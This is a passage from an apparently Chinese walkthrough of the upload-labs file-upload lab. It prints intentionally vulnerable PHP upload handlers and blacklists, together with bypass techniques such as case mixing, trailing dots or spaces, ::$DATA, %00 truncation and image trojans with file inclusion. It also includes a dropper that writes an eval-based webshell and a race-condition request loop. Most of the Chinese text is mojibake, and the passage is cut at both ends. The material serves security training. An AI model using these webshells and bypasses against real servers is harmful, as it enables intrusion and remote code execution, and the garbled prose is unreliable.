.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼ Pass-05å‘é»‘åå•ä¸­å¢åŠ äº†.htaccessåç¼€æ–‡ä»¶; æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; åˆ é™¤äº†è¯¥è¯­å¥ï¼š$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•è¶…çº§åŠ å¼º;.htaccessåŠ å…¥äº†é»‘åå•ï¼Œå–æ¶ˆäº†åç¼€åå…¨å˜ä¸ºå°å†™å­—æ¯çš„strtolowerï¼ˆï¼‰å‡½æ•° ç»•è¿‡æ–¹å¼ï¼šé‡‡ç”¨å¤§å°å†™æ··åˆæ–¹å¼ç»•è¿‡.PhP,.PHp5ï¼Œæˆ–ç€.hTacCesSæ–‡ä»¶â€¦ ä¸Šä¼ æˆåŠŸï¼ +++ Pass-06é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swfåç¼€æ–‡ä»¶ï¼ æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; æç¤ºå’Œæºç é‡Œçš„é»‘åå•å¹¶ä¸ä¸€è‡´ï¼Œæç¤ºé‡Œå°‘äº†.htaccess$file_ext = trim($file_ext); //é¦–å°¾å»ç©º+++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•;å»æ‰äº†å»é™¤ç©ºæ ¼çš„trimå‡½æ•°ï¼› ç»•è¿‡æ–¹å¼ï¼šé€‰æ‹©åç¼€ä¸º.phpçš„ä¸€å¥è¯ä¸Šä¼ ï¼ŒæŠ“åŒ…ååœ¨åé¢å¢åŠ ç©ºæ ¼; ä¸Šä¼ æˆåŠŸï¼ +++ Pass-07é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ æ‰€æœ‰å¯ä»¥è§£æçš„åç¼€ï¼ æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•; ç»•è¿‡æ–¹å¼ï¼šæ²¡æœ‰åˆ é™¤ç»“å°¾çš„â€œ.â€ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡; +++ Pass-08é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passç¦æ­¢ä¸Šä¼ .php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ï¼ æºç ï¼š 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•; ç»•è¿‡æ–¹å¼ï¼šWindowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åä¸­test.php::$DATAä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ªtest.phpçš„æ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒï¼Œå¹¶è¢«è§£æã€‚ +++ Pass-09é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passåªå…è®¸ä¸Šä¼ .jpg|.png|.gifåç¼€çš„æ–‡ä»¶ï¼ æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•; ç»•è¿‡æ–¹å¼ï¼š 12$img_path = UPLOAD_PATH.'/'.$file_name;è·¯å¾„æ‹¼æ¥çš„æ˜¯å¤„ç†åçš„æ–‡ä»¶å åŠ  ç‚¹+ç©ºæ ¼+ç‚¹ +++ Pass-10é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼  * æŸ¥çœ‹æç¤ºï¼š æœ¬passä¼šä»æ–‡ä»¶åä¸­å»é™¤.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccesså­—ç¬¦ï¼ æºç ï¼š 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯é»‘åå•; 12$file_name = str_ireplace($deny_ext,\"\", $file_name);ç”¨str_ireplaceå‡½æ•°å°†ç¬¦åˆé»‘åå•ä¸­çš„åç¼€åè¿›è¡Œæ›¿æ¢ä¸ºç©º ç»•è¿‡æ–¹å¼ï¼šåŒå†™ç»•è¿‡ï¼› +++ Pass-11é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼ æŸ¥çœ‹æç¤ºï¼š æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼ æºç ï¼š 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else&#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•; 12$img_path = $_GET['save_path'].\"/\".rand(10,99).date(\"YmdHis\").\".\".$file_ext;// $img_pathç›´æ¥æ‹¼æ¥ ç»•è¿‡æ–¹å¼ï¼šåˆ©ç”¨%00æˆªæ–­ç»•è¿‡ï¼› éœ€å…³é—­magic_quotes_gpc php ç‰ˆæœ¬&lt;5.3.4 +++ Pass-12é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼šæç¤ºï¼šåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼ æŸ¥çœ‹æç¤ºï¼š æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼ æºç ï¼š 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å¤±è´¥\"; &#125; &#125; else &#123; $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•; ç»•è¿‡æ–¹å¼ï¼š åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ï¼›è¿™ä¸€å…³å’ŒPass-11çš„åŒºåˆ«æ˜¯ï¼Œ00æˆªæ–­æ˜¯ç”¨åœ¨POSTä¸­ï¼Œä¸”æ˜¯åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ã€‚å› ä¸ºPOSTä¸ä¼šåƒGETé‚£æ ·å¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚/åœ¨BPä¸­é€‰ä¸­%00å³é”®ï¼Œå¯ä»¥ç›´æ¥ç¼–ç ï¼› éœ€å…³é—­magic_quotes_gpc php ç‰ˆæœ¬&lt;5.3.4 +++ Pass-13é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼ * æŸ¥çœ‹æç¤ºï¼š æœ¬passæ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ï¼ æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•;getReailFileTypeå‡½æ•°åªä¼šè¯»å–æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚ 12$file = fopen($filename, \"rb\");$bin = fread($file, 2); //åªè¯»2å­—èŠ‚ ç»•è¿‡æ–¹å¼ï¼šå›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨ï¼› åˆ¶ä½œå›¾ç‰‡é©¬ï¼š 12copy 1.jpg/a + 1.txt/b 2.jpg//1.txtä¸­çš„å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œ1.jpgåˆ™æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚ç”Ÿæˆçš„å›¾ç‰‡é©¬æ˜¯2.jpg åˆ©ç”¨include.phpå®ç°æ–‡ä»¶åŒ…å« 123456789101112&lt;?php/*æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼*/header(\"Content-Type:text/html;charset=utf-8\");$file = $_GET['file'];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; èšå‰‘è¿æ¥ +++ Pass-14é¦–å…ˆï¼Œå°è¯•ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºä¿¡æ¯ä¸ºï¼š*æç¤ºï¼šæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼ * æŸ¥çœ‹æç¤ºï¼š æœ¬passä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼ æºç ï¼š 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; &#125; &#125;&#125; +++ æ‹¦æˆªæ–¹å¼ï¼šæœåŠ¡ç«¯ç™½åå•**;æ ¡éªŒäº†æ–‡ä»¶å¤´** 1$info = getimagesize($filename); ç»•è¿‡æ–¹å¼ï¼šå›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨ï¼› +++ Pass-15éœ€è¦å¼€å¯php_exifæ¨¡å— ç»•è¿‡æ–¹å¼ï¼šå›¾ç‰‡é©¬+æ–‡ä»¶åŒ…å«åˆ©ç”¨ï¼› +++ Pass-16è¿™é‡Œä½¿ç”¨å®¹æ˜“ç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„gifæ–‡ä»¶ã€‚ç°åœ¨åˆ¶ä½œä¸€ä¸ªgifå›¾ç‰‡é©¬ï¼Œcopyå°±å¯ä»¥äº†ã€‚ä¹Ÿå¯ä»¥winhexåˆ¶ä½œã€‚ åˆ¶ä½œåä¾¿ä¸Šä¼ ï¼Œå‘ç°æ— æ³•åˆ©ç”¨ã€‚ç„¶åå°†ä¸Šä¼ çš„å›¾ç‰‡é‡æ–°ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾å…¥winhexï¼Œè¿›è¡Œå¯¹æ¯”ã€‚ å¯ä»¥æ‰¾åˆ°äºŒæ¬¡æ¸²æŸ“åä¸å˜çš„åœ°æ–¹ï¼Œè€Œè¿™ä¸ªåœ°æ–¹å°±æ˜¯å¯ä»¥æ’å…¥ä¸€å¥è¯çš„åœ°æ–¹ã€‚ ä¸Šä¼ ä¿®æ”¹å¥½çš„å›¾ç‰‡é©¬ï¼Œèšå‰‘è¿æ¥æˆåŠŸã€‚ å›¾ç‰‡é©¬äºŒæ¬¡æ¸²æŸ“ +++ Pass-17æ‹¦æˆªæ–¹å¼ï¼šç™½åå•éªŒè¯ï¼Œæ¡ä»¶ç«äº‰ è¿™ä¸€å…³æ˜¯å…ˆä¸Šä¼ å†åˆ¤æ–­ï¼Œæ‰€ä»¥å®åœ¨åˆ¤æ–­å‰å°±å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œè¯·æ±‚ã€‚ å…ˆåˆ›å»ºä¸€ä¸ªwebshell.phpï¼Œå†…å®¹ä¸º 123&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[\"cmd\"]) ?&gt;');?&gt; å†ä½¿ç”¨pythonä¸æ–­è¯·æ±‚ 123import requestswhile 1: requests.get(\"http://localhost/upload-labs/upload/webshell.php\") è¿è¡Œpythonä»£ç ï¼Œå†å¼€å§‹ä¸Šä¼ phpæ–‡ä»¶ã€‚ çœ‹æ˜¯å¦æœ‰shell.php; èšå‰‘è¿æ¥ï¼› +++ Upload Labs æ–‡ä»¶ä¸Šä¼ é¡¹ç›®åœ°å€ï¼šhttps://github.com/c0ny1/upload-labs ç¬¬1å…³ å‰ç«¯jsç»•è¿‡12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!\"); return false; &#125; //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext = \".jpg|.png|.gif\"; //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name = file.substring(file.lastIndexOf(\".\")); //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ \" + allow_ext + \"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; å‰ç«¯ç¦ç”¨js æŠ“åŒ…ç»•è¿‡ ç¬¬2å…³ content-type123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; &#125; &#125; else &#123; $msg = 